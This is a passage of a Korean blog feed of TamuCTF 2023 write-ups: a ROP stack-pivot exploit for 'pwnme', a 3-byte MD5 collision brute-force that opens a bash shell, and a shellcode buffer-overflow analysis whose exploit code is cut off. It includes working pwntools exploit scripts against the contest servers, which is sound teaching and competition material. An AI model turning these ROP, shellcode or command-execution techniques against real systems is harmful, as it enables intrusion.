0x007fff6312c768  →  0x007fff6312d9b8  →  0x656d6e77702f2e (<span class="string">&quot;./pwnme&quot;</span>?)</span><br><span class="line"><span class="variable">$rcx</span>   : 0x007feb21b1f931  →  0x5777fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span><br><span class="line"><span class="variable">$rdx</span>   : 0x48              </span><br><span class="line"><span class="variable">$rsp</span>   : 0x007fff6312c630  →  0x00000000401185  →  &lt;__libc_csu_init+85&gt; pop rsp</span><br><span class="line"><span class="variable">$rbp</span>   : 0x6161616161616161 (<span class="string">&quot;aaaaaaaa&quot;</span>?)</span><br><span class="line"><span class="variable">$rsi</span>   : 0x007fff6312c618  →  0x6161616161616161 (<span class="string">&quot;aaaaaaaa&quot;</span>?)</span><br><span class="line"><span class="variable">$rdi</span>   : 0x0               </span><br><span class="line"><span class="variable">$rip</span>   : 0x007feb21c2e1fd  →  &lt;pwnme+54&gt; ret </span><br><span class="line"><span class="variable">$r8</span>    : 0x00000000401190  →  &lt;__libc_csu_fini+0&gt; ret </span><br><span class="line"><span class="variable">$r9</span>    : 0x007feb21c38d70  →   endbr64 </span><br><span class="line"><span class="variable">$r10</span>   : 0x007feb21a34bd0  →  0x000f001200001a3f</span><br><span class="line"><span class="variable">$r11</span>   : 0x246             </span><br><span class="line"><span class="variable">$r12</span>   : 0x0               </span><br><span class="line"><span class="variable">$r13</span>   : 0x007fff6312c778  →  0x007fff6312d9c0  →  <span class="string">&quot;SHELL=/bin/bash&quot;</span></span><br><span class="line"><span class="variable">$r14</span>   : 0x0               </span><br><span class="line"><span class="variable">$r15</span>   : 0x007feb21c67000  →  0x007feb21c682c0  →  0x0000000000000000</span><br><span class="line"><span class="variable">$eflags</span>: [zero CARRY PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00 </span><br></pre></td></tr></table></figure><ul><li>쓸만해 보이는 가젯들</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401184: pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401186: pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401188: pop r14; pop r15; ret; </span><br><span class="line">0x000000000040118a: pop r15; ret; </span><br><span class="line">0x0000000000401183: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401187: pop rbp; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401109: pop rbp; ret; </span><br><span class="line">0x000000000040118b: pop rdi; ret; </span><br><span class="line">0x0000000000401189: pop rsi; pop r15; ret; </span><br><span class="line">0x0000000000401185: pop rsp; pop r13; pop r14; pop r15; ret; </span><br><span class="line">0x0000000000401010: call rax; </span><br><span class="line">0x0000000000401191: mov rax, qword ptr [rdi]; ret; </span><br><span class="line">0x0000000000401192: mov eax, dwocrd ptr [rdi]; ret; </span><br><span class="line">0x00000000004011b2: sub rax, rsi; ret; </span><br></pre></td></tr></table></figure><h2 id="Worng-Idea"><a href="#Worng-Idea" class="headerlink" title="Worng Idea"></a>Worng Idea</h2><p>처음에 뭔가 수상한 가젯들 보고 아래와 같이 실행시키겠다는 가설을 세웠다. <code>pwnme@got</code>와 <code>win</code> 함수의 오프셋을 구해서 <code>libc leak</code> 없이 라이브러리 함수를 실행시킬 것이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 0x000000000040118b: pop rdi; ret; </span><br><span class="line">rdi = pwnme.got</span><br><span class="line">// mov rax, qword ptr [rdi]; ret; </span><br><span class="line">rax = &amp;pwnme</span><br><span class="line">// 0x0000000000401189: pop rsi; pop r15; ret; </span><br><span class="line">rsi = X</span><br><span class="line">// 0x00000000004011b2: sub rax, rsi; ret; </span><br><span class="line">rax = &amp;pwnme - X</span><br><span class="line">// 0x0000000000401010: call rax; </span><br><span class="line">rip = &amp;pwnme - X (win)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;pwnme&#x27;</span>])</span><br><span class="line">payload += p64(mov_rax_rdi) <span class="comment"># rax에 립시 주소가 들어갑니다</span></span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x18</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(sub_rax_rsi)</span><br><span class="line">payload += p64(call_rax)</span><br></pre></td></tr></table></figure><p>하지만 길이가 0x10 오버나서 사용하지 못했다. 이 아이디어로 길이를 줄여보려다가 잘 안되어서 다른 아이디어를 생각했다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>rsp를 위로 계속 올려서 스택 공간을 마련하자는 생각을 했다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401199                 sub     rsp, 18h</span><br></pre></td></tr></table></figure><p>스택 공간을 마련해서 첫번째 생각한 아이디어의 payload를 넣어서 <code>ret</code> 가젯으로 실행시키는 것을 목표로 했다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;pwnme&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwnme&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libpwnme.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40118b</span></span><br><span class="line">mov_rax_rdi = <span class="number">0x401191</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401189</span></span><br><span class="line">sub_rax_rsi = <span class="number">0x4011b2</span></span><br><span class="line">call_rax = <span class="number">0x401010</span></span><br><span class="line">sub_rsp_0x18 = <span class="number">0x401199</span></span><br><span class="line">ret = pop_rdi + <span class="number">1</span></span><br><span class="line">pop1 = <span class="number">0x40118a</span></span><br><span class="line"></span><br><span class="line">rop_payload1 = p64(ret)</span><br><span class="line">rop_payload1 += p64(pop_rdi)</span><br><span class="line">rop_payload1 += p64(e.got[<span class="string">&#x27;pwnme&#x27;</span>])</span><br><span class="line"></span><br><span class="line">rop_payload2 = p64(mov_rax_rdi)</span><br><span class="line">rop_payload2 += p64(pop_rsi_r15)</span><br><span class="line">rop_payload2 += p64(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">rop_payload3 = p64(<span class="number">0</span>)</span><br><span class="line">rop_payload3 += p64(sub_rax_rsi)</span><br><span class="line">rop_payload3 += p64(call_rax)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spill</span>(<span class="params">values</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">    payload += p64(sub_rsp_0x18)</span><br><span class="line">    payload += <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload += values</span><br><span class="line">    pause() <span class="comment"># picture</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">spill(rop_payload3)</span><br><span class="line">spill(rop_payload2)</span><br><span class="line">spill(rop_payload1)</span><br><span class="line"></span><br><span class="line">payload = p64(ret)*<span class="number">7</span></span><br><span class="line">payload += p64(pop1)</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>spill</code> 함수에서 payload에 <code>a*0x10</code>을 추가해준 이유가 <code>pwnme</code> 함수에서 <code>sub     rsp, 10h</code> 인스트럭션을 수행하기 때문에 넣어줬다. payload를 순서대로 겹치는 것 없이 정렬시켜줘야하기 때문이다.<br><code>pop1</code>을 한 이유는 저 스택 상황에서 보이는게 <code>0x4141414141414141</code>였기 때문에 하나 빼주고 <code>rsp</code>를 내려줬다.</p><p>아래는 <code>spill</code> 함수에서 <code>pause()</code>를 이용하여 <code>pwnme</code> 함수의 <code>read</code>에 입력을 보낸 후 <code>rsp</code>를 출력한 상황이다. <code>rop_payload1</code>를 보낼 때 캡쳐했다.</p><img src="/images/230503-tamu2023-8.Pwnme-pwn/Screenshot 2023-05-03 at 20.05.44.png" width=700/><br><ul><li>빨간색: <code>pwnme</code> 함수에서 <code>sub     rsp, 10h</code>인스트럭션을 수행하여 <code>rsp</code>가 더 높아졌다.</li><li>노란색: <code>read</code> 함수에서의 <code>buf</code> 원래 사이즈 + <code>rbp</code></li><li>파란색: payload를 적기 위해 스택 공간을 넓히기 위해 <code>sub     rsp, 18h</code>을 수행해야 한다.</li><li>연두색: <code>rop_payload</code>가 제대로 이어지기 위해 offset을 맞춰주기 위한 dummy이다.</li><li>주황색: 스택 공간이 넓어졌고, 나머지 <code>rop_payload</code>를 써야하는 공간이다. 뒤에도 <code>rop_payload</code>가 적혀있는데 이것과 이어져서 써줘야 한다. 그래서 연두색이 이 이어지기 위한 offset을 맞추기 위한 dummy가 들어가야 한다.</li></ul><p>스택에 <code>rop_payload</code>를 다 적어주고 <code>ret</code>를 여러번 실행시켜서 <code>rsp</code>를 <code>rop_payload</code> 있는 곳까지 내려서 실행시키면 끝이다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;r0p_g4dg3ts_r_c00l&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - MD5 (crypto, md5 collision)</title>
      <link href="/230503-tamu2023-9.MD5-crypto/"/>
      <url>/230503-tamu2023-9.MD5-crypto/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>MD5 jail?!?!?!?!<br>Author: anomie</p></blockquote><ul><li>[114 solves &#x2F; 373 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5sum</span>(<span class="params">b: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(b).digest()[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelisted_cmd = <span class="string">b&#x27;echo lmao&#x27;</span></span><br><span class="line">whitelisted_hash = md5sum(whitelisted_cmd) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(whitelisted_hash))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(<span class="built_in">hex</span>(u32(whitelisted_hash.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>)))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cmd = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).encode()</span><br><span class="line">        <span class="keyword">if</span> cmd == <span class="string">b&#x27;exit&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Goodbye&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> md5sum(cmd) != whitelisted_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Invalid command, try &quot;<span class="subst">&#123;whitelisted_cmd.decode()&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            out = subprocess.check_output([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>, cmd])</span><br><span class="line">            <span class="built_in">print</span>(out.decode())</span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;Command returned non-zero exit status <span class="subst">&#123;e.returncode&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>문제 스크립트에서 <code>md5sum</code> 함수를 살펴보면 3바이트만 리턴한다. </p><p>문제 풀이에 앞서 <code>md5 collision</code>에 대해 간단히 살펴봤다. <code>md5</code>는 같은 입력값이면 항상 같은 출력값이 나온다. 서로 다른 값을 입력할 경우 같은 출력값이 나올 확률은 굉장히 낮지만 같은 값이 나올 가능성이 존재한다. 예를 들면 <code>AAAA</code>와 <code>BBBB</code>의 <code>md5</code>를 적용했을 때 출력값이 같을 수도 있다는 의미이다. 이런 상황을 <code>md5 collision</code>이라고 한다. </p><p>문제 스크립트는 ‘echo lmao’를 <code>md5sum</code> 함수를 거친 후의 값과 같으면 입력값을 <code>bash</code>로 실행할 수 있다. 막막해보이지만 사실 <code>md5sum</code> 함수에서의 전체 해시값의 3바이트만 똑같은 입력값을 찾으면 된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>나는 쉘을 획득하기 위해 <code>bash #</code>을 고정으로 두고 <code>#</code> 주석 뒤에 숫자를 적어줘서 브루트포싱으로 <code>md5</code> 해시가 3바이트만 똑같은 경우를 찾으려고 했고, 성공했다!</p><h3 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from pwn import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;md5&quot;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;&gt;&#x27;,&#x27;bash # 2695494&#x27;)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5sum</span>(<span class="params">b: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(b).digest()[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">whitelisted_cmd = <span class="string">b&#x27;echo lmao&#x27;</span></span><br><span class="line">whitelisted_hash = md5sum(whitelisted_cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000000000</span>):</span><br><span class="line">    input_cmd = <span class="string">b&#x27;bash # &#x27;</span> + <span class="built_in">str</span>(i).encode()</span><br><span class="line">    input_hash = md5sum(input_cmd)</span><br><span class="line">    <span class="comment"># print(repr(hex(u32(input_hash.ljust(4, b&#x27;\x00&#x27;)))))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_hash != whitelisted_hash:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;###############################################&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(input_cmd)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $ cat flag.txt &gt;&amp;2</span></span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;3_bYt3_MD5_1s_Ju5t_pr00f_0f_W0rK&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
            <tag> md5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Sea Shells (pwn, shellcode)</title>
      <link href="/230503-tamu2023-5.Sea_Shells-pwn/"/>
      <url>/230503-tamu2023-5.Sea_Shells-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Sally sold some seashells by the seashore. Try to guess how many she sold, I bet you will never be able to!<br>Author: <code>_mac_</code></p></blockquote><ul><li>[74 solves &#x2F; 447 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>바이너리와 소스코드가 제공된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p><code>NX disabled</code>이기 때문에 shellcode 실행이 가능하다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> n, <span class="type">unsigned</span> <span class="type">long</span> sold)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((n &amp; <span class="number">0xffff</span>) == (sold &amp; <span class="number">0xffff</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> num_sold;</span><br><span class="line">    <span class="type">char</span> resp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> c;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> d;</span><br><span class="line">    </span><br><span class="line">    num_sold = rand();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s not that easy though, enter 4 numbers to use to guess!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// ask user for input</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;b);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;3rd number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;4th number: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;d);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// perform some calculations on the numbers</span></span><br><span class="line">        d = d + c;</span><br><span class="line">        c = c ^ b;</span><br><span class="line">        b = b - a;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (check(d, num_sold)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Woohoo! That&#x27;s exactly how many she sold!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a little something Sally wants to give you for your hard work: %lx\n&quot;</span>, &amp;d);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Sorry, that&#x27;s not quite right :(\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// go again?</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Would you like to guess again? (y/n) &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;resp);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">while</span> (resp == <span class="string">&#x27;Y&#x27;</span> || resp == <span class="string">&#x27;y&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sally sold some sea SHELLS!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try to guess exactly how many she sold, I bet you can&#x27;t!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    welcome();</span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;bye now&#x27;\n-Sally\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>아래에서 bof가 발생한다. 왜냐면 <code>%s</code>로 입력받기 때문.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Would you like to guess again? (y/n) &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;resp);</span><br></pre></td></tr></table></figure><p>그 전에 <code>check(d, num_sold)</code>을 통과하면 <code>d</code> 변수의 주소를 알려준다. 이 주소는 스택 주소이기 때문에 쓸데가 많다. <code>check(d, num_sold)</code>을 통과하기 위해 <code>num_sold = rand();</code>을 예상해야 하는데, 이는 <code>seed</code>가 없기 때문에 항상 일정하다. 처음에 2바이트 브루트포싱을 이용하여 값을 예측하려고 했으나, 계속 실행하고 테스트하다 보니 <code>0x4500</code>으로 일정한 것을 확인했고, 서버도 동일했다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>rbp+8</code>은 <code>ret</code>이다. 우리는 현재 shellcode를 실행시킬 수 있다. <code>ret</code> 뒤에 shellcode를 위치시켜주자. shellcode가 저장된 주소를 <code>ret</code>에 넣어주자. 우리는 스택 주소를 알고 있기 때문에 가능하다. </p><p>참고로 shellcode를 실행시킬 때 스택이 모자랄 수도 있기 때문에 <code>sub rsp, 0x100</code> 이 어셈도 같이 실행시켰다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight 